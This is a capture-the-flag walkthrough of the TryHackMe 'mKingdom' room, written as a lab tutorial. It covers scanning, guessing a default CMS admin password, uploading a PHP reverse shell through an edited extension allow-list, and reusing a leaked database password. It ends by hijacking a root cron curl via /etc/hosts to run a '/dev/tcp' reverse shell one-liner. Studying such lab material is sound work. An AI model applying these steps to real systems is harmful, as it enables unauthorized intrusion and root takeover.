# mKingdom Walkthrough

## Intro
Welcome to the mKingdom challenge, here is the link to the [room](https://tryhackme.com/room/mkingdom) on TryHackMe.
This is an easy box inspired by the character "Mario" from the video-games and we will have to find the user and root flag in the machine.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's start with a port scan:
```bash
rustscan -a 10.82.190.196 -r 0-65535  --ulimit 5000 -- -sV -sC
```

We can see only port 85 open:
```
PORT   STATE SERVICE REASON  VERSION
85/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 0H N0! PWN3D 4G4IN
```

We can visit it on our web browser `http://10.82.190.196:85`.

In the meanwhile we can start a directory scan:
```bash
gobuster dir -u http://10.82.190.196:85/  -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

This one finds the `/app`, visiting it we find a "jump" button, checking at the source code we see:
```js
  function buttonClick() {
            alert("Make yourself confortable and enjoy my place.");
            window.location.href = 'castle';
        }
```

I took that string as an hint and decided to investigate that: `http://10.82.190.196:85/app/castle/`.
It turns out it is an actual page, it's Toad's website abut mushrooms!?

Scrolling to the bottom section we can notice a "login" link that leads us to this page `http://10.82.190.196:85/app/castle/index.php/login`.
A search online revealed that the default username is "admin", as for the password we can start to test a bunch of the common ones such as:
```
123456
12345678
123456789
admin
1234
Aa123456
12345
password
123
1234567890
```
- this are the 10 most used password online in 2025

And with `password` i successfully logged in.

Exploring the different pages i remembered finding an upload page previously and dropped a random file and got rejected; well know looking at `http://10.82.191.80:85/app/castle/index.php/dashboard/system/files/filetypes` i know why, there is a list of allowed file extension, which we can edit.
Since the website runs on PHP i added `.php`, i guess we can test this with a reverse shell.

The form were we could upload something as a comment was on `http://10.82.191.80:85/app/castle/index.php/blog/hello-world`, uploading here still gives file extension error.
So i went back in the admin panel and found this other page for authenticated uploads `http://10.82.191.80:85/app/castle/index.php/dashboard/files/search` here it accepted my PHP reverse shell at first try.

Once uploaded it gave me this link to the file `http://10.82.191.80:85/app/castle/application/files/6217/6798/8044/shell.php`, before clicking on it we can prepare a listener on our machine:
```bash
nc -lvnp 1234
```

Now we can click on the link and receive the shell as the user "www-data".
The shell is pretty bad and unstable, i made a guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) on how to upgrade it.

Once done we can start investigating the way to escalate our privileges inside the box.
We can see 2 other users: toad and mario.

<br/>

### Privilege Escalation

#### Becoming Toad
Since we are a web user, is frequent in this scenario that in the readable directory for it (`/var/www/`) there are hidden clues about scripts, databases or credentials for a low privileged user in the machine.
A way to find that quickly is:
```bash
grep -lr password | grep -lr toad
```

This returns a file called `database.php`, is worth viewing it:
```bash
cat castle/application/config/database.php
```
```php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

As guessed we have found the password for toad access to the MySQL db, we can also test for a password reuse for Linux:
```bash
su toad
```

And providing that password we have successfully switched to user toad.

<br/>

#### Becoming Mario
Since we are now Toad, we can test if we can run anything as super user with `sudo -l`, but unfortunately we are not allowed to run any command as such.
Enumerating the user home directory we can find a cool ASCII art inside `smb.txt`, not useful for us but nice one.

Looking inside other files we land on `.bashrc` containing an encoded string:
```bash
export PWD_token='aWthVGVOVEFOdE...REDACTED'
```

That is a base64 encoding, we can decode it with:
```bash
echo "aWthVGVOVEFO...REDACTED" | base64 -d
```

Which results in `...REDACTED`, maybe Mario's password?
We can test it with `su mario` and we actually successfully log-in as him.

Now we can get our first flag:
```bash
less user.txt
```
--> REDACTED_FOR_THE_WRITEUP

<br/>

#### Becoming Root
Now that we are Mario we start the enumeration over again and find that this time we can run something as super user:
```
User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
```

We can also notice that we have the ability to edit the hosts file:
```
-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
```

Download this tool:
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
```

Transfer it to the target by serving it in an http server:
```bash
python3 -m http.server
```

On target:
```bash
wget http://10.82.87.104:8000/pspy64s
```

Running it we can notice a process run by root:
```bash
curl mkingdom.thm:85/app/castle/application/counter.sh
```

This means that if we edit the hosts file to point that domain to our machine, were we host an HTTP server containing a fake `counter.sh` script we can run its content as root.
So on our machine let's create a new directory structure:
```
mydir
	-app
		-castle
			-application
				-counter.sh
```

```bash
mkdir DIRECTORY
```

Than we put in the script another reverse shell, (could also have put a command to print the flag on an user owned file, change permissions, add user to sudoers... up to you) 
```bash
echo "/bin/bash -i >& /dev/tcp/10.82.87.104/12345 0>&1" > app/castle/application/counter.sh
```

And prepare a listener:
```bash
nc -lvnp 12345
```

Wait a little bit and you should have a shell as root, now get the last flag:
```bash
less root.txt
```

--> REDACTED_FOR_THE_WRITEUP

<br/>
<br/>

Congratulations you have successfully found the hidden port, brute forced the login form and exploited a file upload vulnerability to gain initial access. Later you performed multiple privilege escalation to finally reach root and read the flag.

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
